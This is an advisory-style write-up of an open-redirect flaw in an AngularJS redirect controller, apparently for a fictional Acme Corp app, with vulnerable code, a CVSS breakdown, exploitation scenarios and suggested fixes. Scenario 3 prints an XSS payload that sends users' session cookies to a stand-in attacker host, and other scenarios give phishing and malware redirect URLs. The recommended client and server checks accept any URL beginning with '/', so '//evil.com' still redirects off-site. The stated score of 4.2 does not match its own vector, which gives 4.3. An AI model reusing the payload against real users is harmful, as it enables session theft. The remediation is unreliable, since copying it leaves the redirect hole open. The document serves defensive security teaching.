# Open Redirect Vulnerability in AngularJS Application

# Vulnerability Case
During the assessment of Acme Corp's AngularJS web application, we discovered an open-redirect vulnerability in a controller responsible for handling URL redirections. The issue arose when user input from the query string was directly assigned to the redirection endpoint via `$window.location.href` without proper validation or sanitization. This vulnerability was identified during a targeted code review and dynamic testing phase, where crafted URLs resulted in redirection to arbitrary external domains, potentially facilitating phishing attacks. The application leverages AngularJS on a Node.js backend, exemplifying the risks inherent in improperly validated client-side navigation.

```javascript
angular.module("acmeApp").controller("RedirectController", function(
  $scope,
  $window,
  $routeParams
) {
  // Retrieve the 'redirectUrl' parameter directly from user input
  const redirectUrl = $routeParams.redirectUrl;

  if (redirectUrl) {
    // Vulnerable pattern: direct assignment without validation
    $window.location.href = redirectUrl;
  }
});
```

The vulnerability occurs because the application directly assigns user input to `$window.location.href` without sanitizing or validating the parameter. An attacker could craft a URL containing a malicious external domain, inducing unsuspecting users to be redirected to a phishing site or a site that serves malicious payloads. Exploitation could be automated via phishing campaigns, potentially compromising user credentials or other sensitive data. Given that the application is built with AngularJS and integrates with Node.js, an exploitation can impact the entire user base by undermining trust and exposing critical business operations to secondary attacks.


context: javascript.angular.security.detect-angular-open-redirect.detect-angular-open-redirect Use of $window.location.href can lead to open-redirect if user input is used for redirection.

# Vulnerability Breakdown
This vulnerability involves an Angular controller directly assigning user-provided URL parameters to window location without validation, enabling attackers to craft malicious links redirecting users to arbitrary domains.

1. **Key vulnerability elements**:
   - Direct assignment of user input from `$routeParams.redirectUrl` to `$window.location.href`
   - Complete absence of URL validation or sanitization
   - AngularJS frontend with Node.js backend increasing attack surface
   - Client-side navigation controls vulnerable to manipulation

2. **Potential attack vectors**:
   - Crafting malicious URLs containing external domains as the redirect parameter
   - Distributing these URLs through phishing campaigns targeting application users
   - Embedding malicious redirects in legitimate-looking communications
   - Social engineering leveraging the trusted domain's reputation

3. **Severity assessment**:
   - The vulnerability primarily impacts integrity through potential user misdirection
   - No direct confidentiality impact as it doesn't expose sensitive information
   - Requires user interaction (clicking on a malicious link)
   - Exploitable remotely with minimal technical expertise
   - Low complexity to execute once a malicious URL is crafted

4. **CVSS v3.1 calculation**:
   - Attack Vector (AV): Network (N) 
   - Attack Complexity (AC): Low (L) 
   - Privileges Required (PR): None (N) 
   - User Interaction (UI): Required (R) 
   - Scope (S): Unchanged (U)
   - Confidentiality (C): None (N) 
   - Integrity (I): Low (L) 
   - Availability (A): None (N) 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N

# Description
An open redirect vulnerability exists in Acme Corp's AngularJS web application. The vulnerability is located in the RedirectController, which handles URL redirections. The controller takes a user-supplied parameter (`redirectUrl`) from the route parameters and directly assigns it to `$window.location.href` without performing any validation or sanitization.

```javascript
angular.module("acmeApp").controller("RedirectController", function(
  $scope,
  $window,
  $routeParams
) {
  // Retrieve the 'redirectUrl' parameter directly from user input
  const redirectUrl = $routeParams.redirectUrl;

  if (redirectUrl) {
    // Vulnerable pattern: direct assignment without validation
    $window.location.href = redirectUrl;
  }
});

```

This allows attackers to craft malicious URLs that redirect users to arbitrary external domains. When a user clicks on a malicious link, they are initially directed to the trusted Acme Corp domain, but are then automatically redirected to the attacker-specified destination. This can be particularly effective in phishing attacks, as the initial URL appears legitimate, increasing the likelihood that users will trust and click on it.

# CVSS
**Score**: 4.2 \
**Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N \
**Severity**: Medium

The Medium severity rating (4.2) is based on:

- **Network (N) attack vector**: The vulnerability can be exploited remotely from anywhere on the internet
- **Low (L) attack complexity**: Exploiting the vulnerability is straightforward and requires no special conditions
- **No privileges (N) required**: No authentication is needed to craft and distribute a malicious URL
- **User interaction (R) required**: A user must click on the malicious link for the attack to succeed
- **Unchanged (U) scope**: The vulnerability affects only the user's session, not other components
- **None (N) confidentiality impact**: The vulnerability itself doesn't disclose any sensitive information
- **Low (L) integrity impact**: Users are redirected to unintended destinations, potentially compromising their trust and leading them to disclose sensitive information to malicious sites
- **None (N) availability impact**: The vulnerability doesn't affect system availability

The severity is Medium because while exploitation is relatively easy, the direct impact is limited to redirecting users rather than directly compromising data or systems. However, this vulnerability can be an effective component in larger attack chains, particularly phishing campaigns that seek to harvest credentials or deliver malware.

# Exploitation Scenarios
**Scenario 1: Phishing Campaign**
An attacker crafts a URL like `https://acme-corp.com/redirect?redirectUrl=https://acme-corp-login.evil.com`, where the destination site is a convincing clone of Acme Corp's login page. The attacker distributes this URL via email, claiming that users need to log in to update their account information. Because the URL begins with the legitimate acme-corp.com domain, users are more likely to trust it. When clicked, users are initially directed to the legitimate site but immediately redirected to the attacker's phishing page, where they unknowingly enter their credentials.

**Scenario 2: Malware Distribution**
An attacker creates a URL like `https://acme-corp.com/redirect?redirectUrl=https://malware-delivery.com/acme-update.exe`, claiming it's an important software update from Acme Corp. When users click the link, they're redirected to a site that automatically downloads malware disguised as a legitimate application update. The initial legitimate domain in the URL helps bypass security awareness training that teaches users to check URLs before clicking.

**Scenario 3: Chain with XSS for Session Hijacking**
An attacker combines the open redirect with a cross-site scripting vulnerability on a third-party site. They craft a URL like `https://acme-corp.com/redirect?redirectUrl=https://vulnerable-site.com/?xss=<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>`. When a user clicks the link, they're first sent to the trusted Acme Corp domain, then redirected to the vulnerable site which executes the XSS payload, sending the user's session cookies to the attacker's server.

# Impact Analysis
**Business Impact:**
- Damage to brand reputation and erosion of user trust when legitimate domain names are used in phishing attacks
- Potential loss of customer credentials leading to account compromise
- Liability risks if redirects lead to malware infection or financial fraud
- Increased customer support costs dealing with compromised accounts
- Potential regulatory concerns if the application handles sensitive customer data

**Technical Impact:**
- Bypassing of same-origin policy protections by leveraging a trusted domain
- Exploitation of users' trust in the application's domain to increase phishing success rates
- Creation of convincing attack chains that begin with legitimate URLs
- Undermining of security awareness training that emphasizes URL inspection
- Potential for session hijacking when combined with other vulnerabilities
- Delivery of malware through trusted channels, potentially bypassing some security controls

# Technical Details
The vulnerability exists in the AngularJS controller responsible for handling redirections in the application. The core issue is that the controller directly uses the value from `$routeParams.redirectUrl` without validating or sanitizing it:

```javascript
angular.module("acmeApp").controller("RedirectController", function(
  $scope,
  $window,
  $routeParams
) {
  // Retrieve the 'redirectUrl' parameter directly from user input
  const redirectUrl = $routeParams.redirectUrl;

  if (redirectUrl) {
    // Vulnerable pattern: direct assignment without validation
    $window.location.href = redirectUrl;
  }
});

```

**Exploitation Mechanics:**

1. The application uses AngularJS routing, which makes route parameters accessible via `$routeParams`
2. The controller accepts a parameter named `redirectUrl` and uses it for navigation
3. No validation occurs to ensure the URL is safe or belongs to a trusted domain
4. The `$window.location.href` assignment causes an immediate browser redirection

The vulnerability is exploited by creating a URL to the application with a `redirectUrl` parameter pointing to a malicious domain:

```
https://acme-corp.com/redirect?redirectUrl=https://malicious-site.com

```

When a user visits this URL, the browser:
1. Connects to acme-corp.com (the legitimate domain)
2. Loads the AngularJS application
3. Executes the RedirectController
4. Extracts "https://malicious-site.com" from the route parameters
5. Sets `window.location.href` to this value, causing an immediate redirect

The exploitation doesn't require any special tools or techniques - simply crafting a URL with the appropriate parameter is sufficient. This simplicity makes the vulnerability particularly dangerous as it can be widely distributed through various channels like email, social media, or compromised websites.

# Remediation Steps
## Implement URL Whitelist Validation

**Priority**: P0

Modify the controller to validate redirect URLs against a whitelist of allowed domains or restrict redirects to relative URLs only:

```javascript
angular.module("acmeApp").controller("RedirectController", function(
  $scope,
  $window,
  $routeParams,
  $location
) {
  const redirectUrl = $routeParams.redirectUrl;
  
  if (redirectUrl) {
    // Only allow relative URLs (starting with /) or specific allowed domains
    if (redirectUrl.startsWith('/')) {
      // Safe relative URL, allow the redirect
      $window.location.href = redirectUrl;
    } else {
      // For absolute URLs, validate against whitelist
      const allowedDomains = [
        'acme-corp.com',
        'secure.acme-corp.com',
        'support.acme-corp.com'
      ];
      
      try {
        const urlObj = new URL(redirectUrl);
        const hostname = urlObj.hostname;
        
        // Check if hostname matches or is subdomain of any allowed domain
        const isAllowed = allowedDomains.some(domain => 
          hostname === domain || hostname.endsWith('.' + domain)
        );
        
        if (isAllowed) {
          $window.location.href = redirectUrl;
        } else {
          // Redirect to safe default page
          $location.path('/home');
        }
      } catch (e) {
        // Invalid URL format, redirect to safe default
        $location.path('/home');
      }
    }
  }
});

```

This implementation:
1. Permits relative URLs (starting with '/') which stay on the same domain
2. For absolute URLs, validates the hostname against a whitelist of allowed domains
3. Handles subdomains appropriately
4. Gracefully handles invalid URL formats
5. Redirects to a safe default page when validation fails
## Implement Server-Side Validation

**Priority**: P1

Add server-side validation as a defense-in-depth measure, since client-side validation can be bypassed:

```javascript
// Server-side (Node.js) middleware for validating redirects
function validateRedirectMiddleware(req, res, next) {
  if (req.query.redirectUrl) {
    const redirectUrl = req.query.redirectUrl;
    
    // Allow relative URLs
    if (redirectUrl.startsWith('/')) {
      return next();
    }
    
    // Validate absolute URLs against whitelist
    const allowedDomains = [
      'acme-corp.com',
      'secure.acme-corp.com',
      'support.acme-corp.com'
    ];
    
    try {
      const urlObj = new URL(redirectUrl);
      const hostname = urlObj.hostname;
      
      const isAllowed = allowedDomains.some(domain => 
        hostname === domain || hostname.endsWith('.' + domain)
      );
      
      if (isAllowed) {
        return next();
      }
    } catch (e) {
      // Invalid URL format
    }
    
    // If we get here, URL is not allowed - strip it from the request
    delete req.query.redirectUrl;
  }
  
  next();
}

// Apply the middleware to relevant routes
app.use('/redirect', validateRedirectMiddleware);

```

This server-side validation:
1. Works as an additional security layer in case client-side validation is bypassed
2. Removes or blocks invalid redirect URLs before they reach the client
3. Maintains the same validation logic on both client and server
4. Follows the principle of defense in depth


# References
* CWE-601 | [URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
* CWE-116 | [Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
